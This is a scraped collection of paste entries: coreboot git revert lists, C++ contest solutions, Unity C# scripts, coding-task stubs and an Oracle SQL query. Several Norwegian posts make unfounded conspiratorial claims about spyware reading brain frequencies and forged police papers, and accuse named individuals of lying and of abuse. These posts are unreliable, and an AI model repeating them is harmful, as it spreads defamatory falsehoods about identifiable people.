git revert 9c599c8b30eca53292cc9af6b01718ac8de46807 #  2994 # GRF # crossgcc: Upgrade IASL from 20221020 to 20230331
git revert 67d95185865651aecb7ef3d8d343ec3cb9e60f77 #  2991 # CBF # arch/x86: Don't allow hw floating point operations
git revert 531023285ea4108d5b847625739d76992ce39200 #  2927 # GRF # soc/intel/quark: Drop support
git revert 6a07db21b12b08c7b975921f2ee1196dd0ec92b3 #  2904 # CBF # console: Add format-checking __printf() to die()
git revert a4298bc3f82f476ce82e3e948f6573f5e38dfb25 #  2823 # GRF # mb/prodrive/atlas: Shorten FSP-M UPD statements
git revert 85556ac1dc9472a7624cdc3c82aa890407ecceda #  2794 # GRF # soc/intel: Clean up some includes
git revert 83faa5d804d183a26b0fa66b5d55bbe5f3b72c89 #  2785 # GRF # mb/google,intel: Use common ChromeEC code for lid shutdown
git revert b78e4620375cc5668db668d900340fd89271c330 #  2743 # GRF # Convert literal uses of CONFIG_MAINBOARD_{VENDOR,PART_NUMBER}
git revert 5fc0afbc170960d05012eec9b3b8717f65a07478 #  2684 # GRF # asus/p2b, emu/qemu-i440fx: Use acpigen_write_processor_device()
git revert 02a19010916f6de42cd5ce0ba74da8ba5ad5c8ec #  2680 # GRF # sb,soc/amd,intel: Drop include <cpu/x86/smm.h>
git revert 240baa31e8a804029069e21f523556d8628f6001 #  2679 # GRF # ACPI: Make FADT entries for RTC/CMOS architectural
git revert 121d3d57adc35ed34204f983a72590f978939b1c #  2652 # GRF # ACPI: Make FADT entries for SMI architectural
git revert 7186e28001ff01e9f48f838eab8ee462c3e8155c #  2651 # GRF # soc/amd: Drop acpi_fill_madt_irqoverride()
git revert 3454367d6401ba7d468e8915706fd022b3b5d59f #  2628 # GRF # AMD binaryPI: Use ACPI_COMMON_MADT_IOAPIC
git revert 8eac12fa7d49de59f63739bcb466e188dbc1ed66 #  2627 # GRF # soc/intel/common: Use ACPI_COMMON_MADT_IOAPIC
git revert 304f8387fe698b66c7c853098001fc83638dd874 #  2626 # GRF # soc/amd: Use ACPI_COMMON_MADT_IOAPIC
git revert 1f9e24052a9d51c015d2841ee66e7408d7bdab84 #  2625 # GRF # asus/p2b, emulation/qemu-i440fx: Use ACPI_COMMON_MADT_IOAPIC
git revert ac61a65fef73fe0700695afd1fc849ed629d59aa #  2624 # GRF # aopen/dxplplusu: Use ACPI_COMMON_MADT_IOAPIC
git revert 6437409b760a927a34bf5e804703873af898e14f #  2623 # GRF # soc/intel/baytrail,braswell: Use COMMON_MADT_IOAPIC
git revert 81dc352032cacb309ed9335f394969d847820511 #  2622 # GRF # intel/bd82x6x,broadwell,lynxpoint: Use ACPI_COMMON_MADT_IOAPIC
git revert 7f8e2a6a4a9cb1544ef8fa19850abeb3d4213931 #  2621 # GRF # sb/intel: Use ACPI_COMMON_MADT_IOAPIC
git revert 10bdee13272a77aed46912363db691cf4c088a93 #  2620 # GRF # ACPI: Add COMMON_ACPI_MADT_IOAPIC and CUSTOM_ACPI_MADT
git revert e742b68f1ac9324ce1f700323f1226e86d068a8c #  2619 # GRF # arch/x86/ioapic: Promote ioapic_get_sci_pin()
git revert ae1b2d49cf0ad09ff8f1e3904a9e7b23d6fb423b #  2618 # GRF # soc/intel: Introduce ioapic_get_sci_pin()
git revert 9368cf90255daeb53765d442a639f86ee5be1f29 #  2615 # GRF # acpi/acpi.c: Reduce scope of some functions
git revert 27af3e6b111f462a71762bd56363d06d73505284 #  2599 # GRF # include/cpu/amd/mtrr: fix typo in get_top_of_mem_above_4gb
git revert 7c302cf20859592a32e19fb6eb434dfb06b1d3c3 #  2583 # GRF # cpu/amd/pi/00730F01: rename fixme.c to cpu_io_init.c
git revert fb532c711e2ef317108d6ffc35ae751bf7d58530 #  2545 # GRF # include/cpu/amd/mtrr: return uint32_t from get_top_of_mem_below_4gb
git revert 5e9afe7272d110265ffa6f5465fa942c2bf4961f #  2544 # CBF # include/cpu/amd/mtrr: rename functions to get top of memory regions
git revert 71fd3becf0f6aafa1b17495233129b06893402b1 #  2492 # GRF # soc/intel/baytrail: Make acpi_madt_irq_overrides() static
git revert 69a13964ea6c5fda6ddf475a9ea905aa7376620c #  2491 # GRF # sb,soc/amd,intel: Add and use ACPI_COMMON_MADT_LAPIC
git revert 36e6f9bc047f86e1628c8c41d3ac16d80fb344de #  2480 # GRF # soc/intel/xeon_sp: Don't sort struct device cpus for numa
git revert 8547429d396a68fc82cc6aff5b7fa61ae8235834 #  2474 # GRF # acpi/acpi.c: Follow spec more closely for MADT
git revert f4dff389ee90640cd2f9cd4b34f59ce14a738379 #  2456 # GRF # cpu/x86/mp_init.c: Set topology on BSP
git revert 2e9f0d3b6aa754dc71cd36086d1eb2a839bdb7bd #  2419 # GRF # ACPI: Add helper for MADT LAPICs
git revert 9ac1fb729fa316564992403580254b1c4afbf9c2 #  2418 # CBF # ACPI: Add helper for MADT LAPIC NMIs
git revert 899c713e3eb073491d8b954165919daa87609493 #  2417 # CBF # binaryPI: Use common code for LAPIC NMIs
git revert e84b095d3a238ae5fd734c4c186132a4e07eea07 #  2409 # GRF # util/sconfig: Remove unused ioapic and irq keywords
git revert 8b8400a889abadbbd2156d4a35a27203068766f1 #  2408 # GRF # drivers/fsp2_0/mp_service_ppi: Use struct device to fill in buffer
git revert 177e13513644b4d3de2529468e827ebfcadbda02 #  2360 # CBF # cpu/x86/topology: Add code to fill in topology on struct path
git revert ddf48eb7c75687398d6a390bc21a50d74aef5df6 #  2359 # GRF # cpu/mp_init.c: Only enable CPUs once they execute code
git revert a804f9195eb8fd93a2a6650cc24a26e422696214 #  2358 # GRF # cpu/smm_module_loader.c: Fix up CPU index locally
git revert 21ca7753bf619f1de8dca79fd1113a9c22335f11 #  2356 # GRF # cpu/x86/mp_init.c: Keep track of initial lapic ID inside device_path
git revert 0686c69802867293644a924bc29812697eace76f #  2300 # GRF # util/crossgcc: Update binutils from 2.37 to 2.40
git revert 586b1c8da06fe34f91c747440730b31428248b34 #  2181 # GRF # mb/prodrive/atlas: Add workaround for CLKREQ pins
git revert 4f13239318a92451dddcc821d9fb977c1d0b6994 #  2138 # GRF # mb/prodrive/atlas: Configure PCIe CLKREQ
git revert 13dcdff7c7e1877887c3eb696b8de35872937d41 #  2127 # GRF # mb/asrock/b75pro3-m: Disable unused ME KT PCI device
git revert ac8c378777d861000d82eea1c7439f16dcd45797 #  1940 # GRF # cpu/x86/smm: Add PCI resource store functionality
git revert 829e8e65b93963d15367092cd3d364c230465720 #  1809 # GRF # ##### soc/intel: Use common codeflow for MP init
git revert 36847977cb95e319ec67ab2edf85e6ea96783628 #  1760 # GRF # ##### util/crossgcc: Update GCC from 11.2 to 11.3
git revert c013fa6234f08e22dd3706849936847cf82b5024 #  1748 # GRF # mb/scaleway/tagada: Drop support
git revert 107e7aa0f58f79ee5719f82c7147e53d7d9fa218 #  1723 # GRF # cpu/x86/smm: Enable setting SMM console log level from mainboard
git revert 893c3ae892961facc9be8bd300160222e694ab34 #  1543 # GRF # tree: Drop repeated words
git revert 584d5e1cbabc1a8ce679597263d22a2a9b87c9f7 #  1532 # GRF # soc/intel/apl: Hook up cpu ops in devicetree
git revert 01c8c5936451d1f31dcb0a1c79f1f8e01dead83b #  1527 # GRF # Makefile.inc: Use 'Wmissing-include-dirs' command option
git revert b5df65a9aaee50421913ace6d7a4b35e0ddff676 #  1501 # GRF # mb/*: Replace SNB PCI devices with references from chipset.cb
git revert 64e2ecb36fd1d7b289cd9671dcfae2e335528d81 #  1493 # GRF # soc/intel/apl: Move cpu cluster to chipset.cb
git revert 15d5183e4af79624304a8379b71767cd8ee09250 #  1433 # CBF # util/sconfig: Remove lapic devices from devicetree parsers
git revert 2c1511a461cd6dde750090e0337bf3f893710dc1 #  1430 # GRF # crossgcc: Upgrade mpfr from 4.1.1 to 4.2.0
git revert d15a9f9b342e5226be67b6d43e68389d871f7f84 #  1429 # GRF # crossgcc: Upgrade mpc from 1.2.1 to 1.3.1
git revert 6ac0a46bbf9e20c8412ee0d04658b3a2b10d0734 #  1422 # GRF # util/crossgcc/buildgcc: Remove extra ""/"" at the end of IASL_BASE_URL
git revert 69cd729c0cde6f15d1de692f5a2da5d3dfe8ba15 #  1421 # GRF # mb/*: Remove lapic from devicetree
git revert 48fa6dd8f9a8f78f94d508b0a105e2ddaacf99ba #  1326 # CBF # arch/x86/Kconfig: Remove unused NUM_IPI_STARTS
git revert c9cd886a4b2d52734c6d1f5d028b98f0f3b1bcce #  1178 # CBF # treewide: Remove unused <cpu/x86/smm.h>
git revert 8b93a173fbed29ea356653caa0626e48e81a5f8d #  1177 # CBF # treewide: Remove unused <cpu/amd/mtrr.h>
git revert 16a444c5011e70298ebd9546a39f9d8b61d95030 #  1155 # GRF # util/crossgcc/Makefile.inc: Terminate quoted string
git revert fc84ae7aa3cf7e8000ef69f854281f4648eeb2b8 #  1124 # CBF # treewide: Remove unused <cpu/amd/msr.h>
git revert 4d75dbd1c1d6362c002a26a5c4e6de74b2816cdf #   950 # GRF # cpu/x86: Set up a separate stack for APs
git revert 3b32af950d704b1d14ddca917dd480f5ebbf09a5 #   821 # GRF # util/crossgcc: Add option to get packages from coreboot's mirror
git revert db65dd60fb11e3d38dbdd9a2e2f64d6ea7ef7576 #   748 # GRF # cpu/x86/mp_init.c: Improve AP entry point
git revert 6e23da2983f83c803cf4abfee542d7f90e8e9eb5 #   622 # CBF # cpu/cpu.h: Change the function signature
git revert f1e78a1349d40f2e8a74b15471fc5560976a566f #   560 # GRF # arch/x86/ioapic.c: Move macros to compilation unit
git revert 2c3ebd8b9d56c01d8e4adadf6f4e4d5b56cdb4e1 #   555 # GRF # mb,sb,soc/intel: Drop useless IO trap handlers
git revert 2393ad0bfb1cd23a0524e7b02a0fd75aff3bf274 #   520 # CBF # Makefile.inc: Use 'Wold-style-definition'
git revert f9679c42876bab145f1b7a2a2e6e1eb5331fa418 #   500 # GRF # nb/intel/gm45: Remove apic 0 from devicetree
git revert 31ba9356b877d670e683953f8b8962a7e6206cc3 #   499 # GRF # nb/intel/i945: Remove apic 0 from devicetree
git revert 803029685f96bccac13359fc616d1577508ba764 #   498 # GRF # nb/intel/x4x: Remove apic 0 from devicetree
git revert 98c92570d9bb363740ae1b2cbbefc3c0f2404cb4 #   497 # CBF # cpu/intel/speedstep: Have nb and sb code provide c5/c6/slfm
git revert 60a422736bde766489db8ff0dc2d56ab333c37cc #   407 # GRF # util/crossgcc: Use GitHub for downloading IASL
git revert cc22607dbfbab0c9ce42c071b5b3c4a304845313 #   420 # GRF # Revert ""src/arch/x86: Use core apic id to get cpu_index()""
git revert a45ed44724a30303030e80898202b77c34498942 #   373 # CBF # crossgcc: Upgrade IASL from 20220331 to 20221020
git revert fa775b7651e4488f0535c17a5e04974e7d1a40b2 #   171 # CBF # cpu/cpu.h: Remove unused functions prototypes
git revert 987f46c276bd1b6b5d15be8ca9aee5f028e37fa7 #   167 # GRF # arch/x86/mpspec.c: Drop weak write_smp_table()
git revert ca5a793ec31c76b168ae2f9d2260b49c79330eb2 #   166 # CBF # drivers/generic/ioapic: Drop poor implementation
git revert d4dfc21f70616bc97191969aa2b6d0196a525fce #   134 # GRF # cpu/x86: Set thread local storage in C code
git revert 1d3c2e65724ed92eeef723c1acdc86ba91cbd682 #   111 # CBF # arch/x86/ioapic: Reduce API exposure
git revert c8a20b9d3b8939e4b7d259c5857631c9690657de #    76 # CBF # cpu/*: Drop PARALLEL_MP leftovers
git revert 36695f278f0ca3cb3a3b0a8ca50b317505882df2 #    18 # CBF # device/resource_allocator_v3: Drop code
git revert f4c11dcb53bbd324741ecd7109584eaa55579f7f #    17 # CBF # cpu/x86: Drop !CPU_INFO_V2 code
git revert 66b2888b77da6721955a918c8cd5399abe786a6a #    16 # CBF # cpu/x86: Drop LEGACY_SMP_INIT
git revert e2d291b5ae4aa49d5b1613e06b86bf2fc8efe4c5 #    15 # CBF # mb/qemu/x86: Remove option for LEGACY_SMP_INIT
git revert 03a6ccd20d9bb54e3a009269b8e454ee8a2e3051 #    14 # CBF # sb/amd: Remove dropped platforms
git revert 1a010236cf922fc28cfb36b604bdf17a9ea3cb82 #    13 # CBF # nb/amd/agesa: Remove leftover code
git revert 81a4fefce223ba358310aec2d988484202c176e2 #    12 # CBF # cpu/amd/agesa: Remove leftover code
git revert 0f12381083fdfc7bb3e6f3b2ac5cd6247506c543 #    11 # CBF # vendorcode/amd/agesa: Drop unused common code
git revert 7036ded25d3a051902862e2a7bdfe15916f0951d #    10 # CBF # vendorcode/amd/agesa/family16: Drop unused platform
git revert 49af4f7f9197e559b2c7142129441679bb1d24a2 #     9 # CBF # {cpu/nb}/amd/family16: Remove platform
git revert 5d152122284880029c123fe2b7dfa20cd8b74632 #     8 # CBF # vendorcode/amd/agesa/fam15tn: Drop unused platform
git revert 9a458e4e58edbfc154dce007961514b5c31cf7aa #     7 # CBF # {cpu/nb}/amd/family15tn: Remove platform
git revert 713e3c087b6128fec2fd17d4373357e10fc928ab #     6 # CBF # vendorcode/amd/agesa/fam14: Remove dropped platform
git revert dbdf170dcdf9edbc860766606e53c6d647d89d38 #     5 # CBF # {cpu/nb}/amd/family14: Remove platform
git revert 6baee3d28729d4b924e8f793c4c7311cebf1f80a #     3 # CBF # mb/*/*: Remove AMD agesa family16 boards
git revert f9decbb0c720662d8e71fe221aef55b7ecf76196 #     2 # CBF # mb/*/*: Remove AMD family14 boards
git revert e56f0c7cab77b89a750b4a3f7f380b1a10cd0d1d #     1 # CBF # mb/*/*: Remove AMD FAMILY15TN boards

#
# git reset --hard 5e8e911b7caee021faff96c4e82a77a42544ea62 # 00000 # - zero commit number = zero point of history before removal
#

git revert ce134ababd6a444082962ccdfcd34415a647f41e # -4568 # GRF # crossgcc/buildgcc: Remove unused GCC_AUTOCONF_VERSION
git revert b0d87f753c9c517ba906115362d32aa4422fd188 # -5952 # TLF # util/crossgcc: Update gcc to 11.2

#
# ERRATA of 1000 ( git reset --hard bd91aa760945cf6229e4ce5e0acc5ed7cd60b398 ) : after doing the <1000 reverts, also add
#     #define SPEEDSTEP_APIC_MAGIC 0xACAC
# to the beginning of ./coreboot/src/cpu/x86/lapic/lapic_cpu_init.c
# to avoid doing the
#     git revert f9679c42876bab145f1b7a2a2e6e1eb5331fa418 #   500 # nb/intel/gm45: Remove apic 0 from devicetree
#     git revert 31ba9356b877d670e683953f8b8962a7e6206cc3 #   499 # nb/intel/i945: Remove apic 0 from devicetree
#     git revert 803029685f96bccac13359fc616d1577508ba764 #   498 # nb/intel/x4x: Remove apic 0 from devicetree
#     git revert 98c92570d9bb363740ae1b2cbbefc3c0f2404cb4 #   497 # cpu/intel/speedstep: Have nb and sb code provide c5/c6/slfm
#"
t73x4P5c,H,Salvens,C++,Thursday 27th of July 2023 04:45:46 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <map>
#include <queue>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    map<string, vector<string>> mp;
    for (int i = 0; i < n; ++i) {
        string name1, rep, name2;
        cin >> name1 >> rep >> name2;
        for (auto& elem: name1) {
            elem = tolower(elem);
        }
        for (auto& elem: name2) {
            elem = tolower(elem);
        }
        mp[name2].emplace_back(name1);
    }

    map<string, int> d;
    queue<string> q;
    string root = ""polycarp"";
    q.push(root);
    d[root] = 1;
    int ans = 0;
    while (!q.empty()) {
        string name = q.front();
        q.pop();
        for (const auto& to: mp[name]) {
            if (d[to] == 0) {
                d[to] = d[name] + 1;
                q.push(to);
                ans = max(ans, d[to]);
            }
        }
    }
    cout << ans << '\n';
}"
TyYEnzrY,Untitled,Derga,C++,Thursday 27th of July 2023 04:39:32 AM CDT,"https://codeforces.com/contest/1851/problem/D


#include<bits/stdc++.h>
using namespace std;
#define ll long long
int main()
{
	ll i,j,k,t,n,a[200005];
	
	cin>>t;
	while(t--)
	{
		cin>>n;set<ll> b;
		ll s=(1+n)*n/2;
		ll x,l=0;
		for(i=1;i<n;i++)
		{
			cin>>x;
			if(x-l<=n)
				b.insert(x-l);
			l=x;
		}
		if(b.size()==n-2+(x!=s))
			cout<<""YES""<<endl;
		else
			cout<<""NO""<<endl;
	}
	return 0;
}




#include <bits/stdc++.h>
using namespace std;
 
using ll = long long;
 
int main()
{
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    int tests;
    cin >> tests;
    while (tests--) {
        ll n;
        cin >> n;
        --n;
        vector<ll> a(n);
        for (ll &i: a) {
            cin >> i;
        }
        vector<ll> numbers(1, a[0]);
        for (int i{1}; i < n; ++i) {
            numbers.push_back(a[i] - a[i - 1]);
        }
        ++n;
        vector<bool> occurred(1 + n, false);
        vector<ll> unexpected_numbers;
        for (auto i: numbers) {
            if (1 <= i && i <= n) {
                if (occurred[i]) {
                    unexpected_numbers.push_back(i);
                } else {
                    occurred[i] = true;
                }
            } else {
                unexpected_numbers.push_back(i);
            }
        }
        vector<ll> missing_numbers;
        for (int i{1}; i <= n; ++i) {
            if (!occurred[i]) {
                missing_numbers.push_back(i);
            }
        }
        if (missing_numbers.size() == 1u) {
            ll sum = n * (n + 1) / 2;
            if (a.back() < sum && missing_numbers[0] == sum - a.back()) {
                cout << ""YES\n"";
            } else {
                cout << ""NO\n"";
            }
            continue;
        }
        if (
            unexpected_numbers.size() == 1u
            && missing_numbers.size() == 2u
            && unexpected_numbers[0] == missing_numbers[0] + missing_numbers[1]
        ) {
            cout << ""YES\n"";
        } else {
            cout << ""NO\n"";
        }
    }
    return 0;
}"
e3YecM1Q,PlayerController27,noobHasan,C#,Thursday 27th of July 2023 04:31:49 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using DG.Tweening;
public class PlayerController : MonoBehaviour {

    public static PlayerController Instance;
    private Rigidbody rb;
    private Transform playerTransform;
    [SerializeField]
    private Transform heliRotor;

    [SerializeField]
    private float Speed = 40f;
    private float RotationSpeed = 10f;
    private float visualRotationSpeed = 10f;
    private float yAxisValue = 0;
    private float SpeedYaw = 1; // rotation Y
    private Quaternion mainRot = Quaternion.identity;

    private float maxVisualRotationZ = 30f; // Maximum Z-axis rotation for the visual.
    private float currentVisualRotationZ = 0f; // Current Z-axis rotation of the visual.

    private bool isSwiping = false;
    private Tweener speedTween;


    private void Awake()
    {
        Instance = this;
        rb = GetComponent<Rigidbody>();
        playerTransform = transform.GetChild(0);
    }
    private void Start()
    {
        mainRot = this.transform.rotation;
        heliRotor.DOLocalRotate(new Vector3(0, 0, 180), .1f, RotateMode.WorldAxisAdd).SetLoops(-1, LoopType.Incremental);
    }

    private void FixedUpdate()
    {
        Vector3 velocityTarget = Vector3.zero;

        Quaternion AddRot = Quaternion.identity;
        yAxisValue = Mathf.Clamp(yAxisValue, -2f, 2f);

        AddRot.eulerAngles = new Vector3(0, yAxisValue, 0);
        mainRot *= AddRot;

        rb.rotation = Quaternion.Lerp(rb.rotation, mainRot, Time.deltaTime * RotationSpeed);
        velocityTarget = (rb.rotation * Vector3.forward) * Speed;

        rb.velocity = velocityTarget;

        if (isSwiping)
        {
            yAxisValue = Mathf.Lerp(yAxisValue, 0, Time.deltaTime);
        }
        else
        {
            yAxisValue = Mathf.Lerp(yAxisValue, 0, Time.deltaTime * 5f);
        }
        float targetVisualRotationZ = yAxisValue * maxVisualRotationZ;
        currentVisualRotationZ = Mathf.Lerp(currentVisualRotationZ, targetVisualRotationZ, Time.deltaTime * visualRotationSpeed);
        playerTransform.localEulerAngles = new Vector3(playerTransform.localEulerAngles.x, playerTransform.localEulerAngles.y, -currentVisualRotationZ);

    }
    public void TurnControl(float turn)
    {
        if (speedTween != null && speedTween.IsActive())
        {
            speedTween.Kill();
        }
        speedTween = DOTween.To(() => Speed, x => Speed = x, 10, 1f);
        yAxisValue += turn * Time.deltaTime * SpeedYaw;
        isSwiping = true;
    }
    public void EndTurnControl()
    {
        if (speedTween != null && speedTween.IsActive())
        {
            speedTween.Kill();
        }
        Speed = 20f;
        isSwiping = false;
    }

    
}
"
05HdBgrT,TouchController27,noobHasan,C#,Thursday 27th of July 2023 04:31:29 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class TouchController : MonoBehaviour
{
    private Vector2 tapPoint, swipeDelta = new Vector2(0, 0);
    private bool isDragging, isMobilePlatform;
    private float rotationMultipliar = 100f;

    private void Awake()
    {
#if UNITY_EDITOR || UNITY_STANDALONE
        isMobilePlatform = false;
#else
        isMobilePlatform = true;
#endif

        Application.targetFrameRate = 60;

    }

    void Update()
    {
        SwipeReader(false);
    }

    private void SwipeReader(bool isRestart)
    {
        if (!isMobilePlatform)
        {
            if (Input.GetMouseButtonDown(0))
            {
                isDragging = true;
                tapPoint = Input.mousePosition;
            }
            else if (Input.GetMouseButtonUp(0))
            {
                ResetSwipe();
                PlayerController.Instance.EndTurnControl();

            };
        }
        else
        {
            if (Input.touchCount > 0)
            {
                if (Input.touches[0].phase == TouchPhase.Began)
                {
                    isDragging = true;
                    tapPoint = Input.touches[0].position;
                }
                else if (Input.touches[0].phase == TouchPhase.Canceled ||
                         Input.touches[0].phase == TouchPhase.Ended)
                {
                    ResetSwipe();
                    PlayerController.Instance.EndTurnControl();
                };
            }
        }

        CalculateSwipe();
    }

    private void CalculateSwipe()
    {
        swipeDelta = Vector2.zero;

        if (isDragging)
        {
            if (!isMobilePlatform && Input.GetMouseButton(0)) swipeDelta = (Vector2)Input.mousePosition - tapPoint;
            else if (Input.touchCount > 0) swipeDelta = Input.touches[0].position - tapPoint;

            float rotationRatio = swipeDelta.x / Screen.width; 
            float finalRotation = rotationRatio * rotationMultipliar;
            PlayerController.Instance.TurnControl(finalRotation);
        }
    }


    public void ResetSwipe()
    {
        isDragging = false;
        tapPoint = swipeDelta - Vector2.zero;
    }
}
"
jFqGX5fe,G,Salvens,C++,Thursday 27th of July 2023 04:28:51 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <map>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    map<string, string> start, tmp;
    for (int i = 0; i < n; ++i) {
        string old, nw;
        cin >> old >> nw;
        if (!tmp.contains(old)) {
            start[old] = nw;
            tmp[nw] = old;
        } else {
            string cur = tmp[old];
            start[cur] = nw;
            tmp[nw] = cur;
        }
    }
    cout << start.size() << '\n';
    for (auto& [x, y]: start) {
        cout << x << ' ' << y << '\n';
    }
}"
z0Kt5eaY,Sigvald,rabbnix,C++,Thursday 27th of July 2023 04:19:47 AM CDT,"Tommy magnussen har jugd for hele simondarres vei.
Aka advokat sigvald "
Mrcre5LB,Darpa fake mot kåre,rabbnix,C++,Thursday 27th of July 2023 04:17:56 AM CDT,"Borettslaget har en politiprinter hvor de skriver ut falske papier mot kåre bull.

Nå må dere slutte å høre på alt mølet dere hører på.

Folk manipulerer synapsene mine... 
Dere hører på falske tanker, falsk tale, falske minner"
T1dLA4GH,F,Salvens,C++,Thursday 27th of July 2023 04:16:29 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>
#include <deque>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    vector<int> a(n);
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
    }
    vector<int> l(n, -1), r(n, n);
    vector<int> st;
    for (int i = n - 1; i >= 0; --i) {
        while (!st.empty() && a[i] < a[st.back()]) {
            l[st.back()] = i;
            st.pop_back();
        }
        st.push_back(i);
    }

    st.clear();
    for (int i = 0; i < n; ++i) {
        while(!st.empty() && a[i] < a[st.back()]) {
            r[st.back()] = i;
            st.pop_back();
        }
        st.push_back(i);
    }
    int ans = 0;
    for (int i = 0; i < n; ++i) {
        ans = max(ans, a[i] * (r[i] - (l[i] + 1)));
    }
    cout << ans << '\n';
}"
nUkPHZZ5,Til ungdommen,rabbnix,C++,Thursday 27th of July 2023 04:13:14 AM CDT,"Til skoleungdommen,  dere blir lurt.
Det er ingen penger å hent.

Sett heller kursen mot simondarres vei. 

Foregår noe utrolig grove greier der.

Ped nek"
rAGpMnSh,Hjernefrekvens3,rabbnix,C++,Thursday 27th of July 2023 04:09:45 AM CDT,"Ikke bruk de telefonene dere har fått utdelt.
Det er pegasus spyware pluss at den tar hjernefrekvensen deres. Dvs hjernens fingeravtrykk..

Alt dette blir brukt mot kåre bull aka sukker

"
numRvcCU,Javascript task,Grifas,JavaScript,Thursday 27th of July 2023 04:00:36 AM CDT,"JavaScript
Task 1
Task: Write a JavaScript function that takes a string as an input parameter and returns the reversed string.

function reverseString(str) {
    // your code 
}


Task 2
Task: Write a JavaScript function that takes an array of numbers as an input parameter and returns a new array where each element is the square of the corresponding element from the original array.

function squareArray(arr) {
    // your code 
"
vYAz3Bmi,PHP tasks,Grifas,PHP,Thursday 27th of July 2023 03:57:59 AM CDT,"PHP
Task 1
Task: Write a PHP function that determines whether the given number is prime (a prime number is a natural number greater than 1 that is divisible only by 1 and itself).

// Code with the task
function isPrime($number) {
    // your code to check for prime number
}


Task 2
Task: You have an array of numbers. Write a PHP function that returns the sum of all elements in the array.

// Code with the task
function sumArray($arr) {
    // your code to calculate the sum of array elements
}
"
ngsV3V4J,Untitled,dimas_subaktianto,Oracle 8,Thursday 27th of July 2023 03:53:35 AM CDT,"SELECT
BK_CD
,US_FI.GETCDNM(BK_CD) AS BK_NM
,ACNT_NO
,FOO.USAHA_CD
,US_FI.GETCDNM(${place}) AS USAHA_NM
,'PERIODE ' || TO_CHAR(TO_DATE(${sDate},'YYYYMMDD'),'DD/MM/YYYY') || ' s/d ' || TO_CHAR(TO_DATE(${eDate},'YYYYMMDD'),'DD/MM/YYYY') AS PER_VIEW
,FOO.USE_CURY
,US_FI.GETCDNM(USE_CURY) AS USE_CURY_NM
,OSD_COA_CD
,SUM(BAL_AMT) + SUM(DECODE(IO_TP,'A',SA_AMT,-SA_AMT)) AS SABAL_AMT
,SUM(BAL_AMT) AS BAL_AMT
,SUM(DECODE(IO_TP,'A',SA_AMT,-SA_AMT)) AS SA_AMT
,SUM(DECODE(IO_TP,'A',IN_AMT,0)) AS IN_AMT_A
,SUM(DECODE(IO_TP,'B',IN_AMT,0)) AS IN_AMT_B
,SUM(DECODE(IO_TP,'A',OUT_AMT,0)) AS OUT_AMT_A
,SUM(DECODE(IO_TP,'B',OUT_AMT,0)) AS OUT_AMT_B
,SUM(DECODE(IO_TP,'A',TAK_AMT,0)) AS TAK_AMT_A
,SUM(DECODE(IO_TP,'B',TAK_AMT,0)) AS TAK_AMT_B
,SUM(DECODE(IO_TP,'A',LAIN_AMT,0)) AS LAIN_AMT_A
,SUM(DECODE(IO_TP,'B',LAIN_AMT,0)) AS LAIN_AMT_B
FROM
(
    SELECT
    A.BK_CD
    ,A.ACNT_NO
    ,A.OSD_COA_CD
    ,A.USAHA_CD
    ,A.DEPT_CD
    ,A.USE_CURY
    ,B.IO_TP
    ,B.SLIP_NO
    ,C.ROW_SUM
    ,C.COA_CD
    ,D.STAT_DMT
    ,0 AS BAL_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(SUBSTR(${sDate},0,4)||'0101','YYYYMMDD') AND TO_DATE(${sDate},'YYYYMMDD')-1  THEN
    ROW_SUM
    ELSE
    0
    END SA_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')  THEN
        DECODE(SUBSTR(COA_CD,0,1),'4',ROW_SUM,0)
    ELSE
        0
    END IN_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')   THEN
        DECODE(SUBSTR(COA_CD,0,1),'5',ROW_SUM,0)
    ELSE
        0
    END OUT_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')   THEN
        DECODE(SUBSTR(COA_CD,0,3),'117',ROW_SUM,'118',ROW_SUM,0)
    ELSE
        0
    END TAK_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')   THEN
        DECODE(SUBSTR(COA_CD,0,1),'4',0,'5',0,DECODE(SUBSTR(COA_CD,0,3),'117',0,'118',0,ROW_SUM))
    ELSE
        0
    END LAIN_AMT
    FROM
    TBFI_BK_ACNT A
    ,TBFI_SLIP B
    ,TBFI_SLIP_DETL C
    ,TBFI_SLIP_STAT D
    WHERE A.USE_YN = 'Y'
    AND B.SLIP_NO = C.SLIP_NO
    AND B.SLIP_NO = D.SLIP_NO
    AND B.PROC_STAT = D.PROC_STAT
    AND A.USAHA_CD LIKE '%' || ${place} || '%'
    AND B.PROC_STAT = 'A2802'
    AND A.BK_CD= B.BK_CD
    AND A.ACNT_NO = B.ACNT_NO
    UNION ALL
    (
    SELECT 
     A.BK_CD
        ,A.ACNT_NO
        ,A.OSD_COA_CD
        ,A.USAHA_CD
        ,A.DEPT_CD
        ,A.USE_CURY
        ,'' IO_TP
        ,'' SLIP_NO
        ,0 ROW_SUM
        ,Y.COA_CD
        ,TO_DATE(${sDate},'YYYYMMDD') STAT_DMT
